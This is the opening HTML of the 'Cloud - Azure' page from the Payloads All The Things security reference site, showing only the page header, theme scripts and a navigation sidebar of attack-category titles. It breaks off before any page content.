
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Cloud%20-%20AWS%20Pentest/">
      
      
        <link rel="next" href="../Cobalt%20Strike%20-%20Cheatsheet/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.1.1">
    
    
      
        <title>Cloud - Azure - Payloads All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.402914a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.a0c5b2b5.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#cloud-azure" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Payloads All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Cloud - Azure
            
          </span>
        </div>
      </div>
    </div>
    
      <form class="md-header__option" data-md-component="palette">
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
          
            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
          
          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
          
            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
            </label>
          
        
      </form>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Payloads All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Payloads All The Things
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../CONTRIBUTING/" class="md-nav__link">
        CONTRIBUTING
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          API Key Leaks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          API Key Leaks
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
        API Key Leaks
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          AWS Amazon Bucket S3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          AWS Amazon Bucket S3
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
        Amazon Bucket S3 AWS
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Account Takeover
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Account Takeover
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Account%20Takeover/" class="md-nav__link">
        Account Takeover
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Argument Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Argument Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Argument%20Injection/" class="md-nav__link">
        Argument Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          CORS Misconfiguration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          CORS Misconfiguration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
        CORS Misconfiguration
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          CRLF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          CRLF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CRLF%20Injection/" class="md-nav__link">
        Carriage Return Line Feed
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          CSRF Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          CSRF Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSRF%20Injection/" class="md-nav__link">
        Cross-Site Request Forgery
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          CSV Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          CSV Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CSV%20Injection/" class="md-nav__link">
        CSV Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          CVE Exploits
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          CVE Exploits
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/" class="md-nav__link">
        Common Vulnerabilities and Exposures
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
        CVE-2021-44228 Log4Shell
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
      
      
      
        <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
          Command Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_12">
          <span class="md-nav__icon md-icon"></span>
          Command Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Command%20Injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
      
      
      
        <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
          DNS Rebinding
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_13">
          <span class="md-nav__icon md-icon"></span>
          DNS Rebinding
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../DNS%20Rebinding/" class="md-nav__link">
        DNS Rebinding
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
      
      
      
        <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
          Dependency Confusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_14">
          <span class="md-nav__icon md-icon"></span>
          Dependency Confusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Dependency%20Confusion/" class="md-nav__link">
        Dependency Confusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
      
      
      
        <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
          Directory Traversal
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_15">
          <span class="md-nav__icon md-icon"></span>
          Directory Traversal
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Directory%20Traversal/" class="md-nav__link">
        Directory Traversal
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
      
      
      
        <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
          File Inclusion
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_16">
          <span class="md-nav__icon md-icon"></span>
          File Inclusion
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../File%20Inclusion/" class="md-nav__link">
        File Inclusion
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
      
      
      
        <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
          GraphQL Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_17">
          <span class="md-nav__icon md-icon"></span>
          GraphQL Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../GraphQL%20Injection/" class="md-nav__link">
        GraphQL Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
      
      
      
        <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
          HTTP Parameter Pollution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_18">
          <span class="md-nav__icon md-icon"></span>
          HTTP Parameter Pollution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
        HTTP Parameter Pollution
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
      
      
      
        <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
          Insecure Deserialization
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_19">
          <span class="md-nav__icon md-icon"></span>
          Insecure Deserialization
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
        Insecure Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/DotNET/" class="md-nav__link">
        .NET Serialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
        Java Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Node/" class="md-nav__link">
        Node Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
        PHP Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
        Python Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/Ruby/" class="md-nav__link">
        Ruby Deserialization
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Deserialization/YAML/" class="md-nav__link">
        YAML Deserialization
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
      
      
      
        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
          Insecure Direct Object References
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_20">
          <span class="md-nav__icon md-icon"></span>
          Insecure Direct Object References
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Direct%20Object%20References/" class="md-nav__link">
        Insecure Direct Object References
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
      
      
      
